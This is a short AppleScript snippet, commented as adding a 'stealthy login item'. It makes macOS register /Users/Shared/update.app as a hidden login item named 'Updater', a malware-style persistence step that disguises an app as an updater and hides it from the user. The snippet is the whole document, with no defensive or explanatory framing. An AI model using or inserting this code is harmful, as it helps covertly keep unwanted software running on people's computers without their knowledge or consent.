-- Adds a stealthy login item
tell application "System Events"
	make login item at end with properties {name:"Updater", path:"/Users/Shared/update.app", hidden:true}
end tell
